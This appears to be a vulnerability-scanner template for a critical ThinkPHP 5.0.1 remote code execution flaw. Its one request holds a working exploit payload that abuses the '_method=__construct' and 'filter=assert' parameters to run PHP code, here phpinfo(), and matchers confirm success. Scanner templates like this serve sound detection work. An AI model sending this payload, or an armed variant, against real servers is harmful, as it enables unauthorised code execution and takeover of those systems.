id: thinkphp-501-rce
info:
  author: lark-lab
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  description: ThinkPHP 5.0.1 allows remote unauthenticated attackers to  execute
    arbitrary code via the 's' parameter.
  name: ThinkPHP 5.0.1 - Remote Code Execution
  severity: critical
  tags: thinkphp,rce
requests:
- body: s=phpinfo()&_method=__construct&filter=assert
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - condition: and
    type: word
    words:
    - PHP Extension
    - PHP Version
  - status:
    - 200
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/?s=index/index/index'
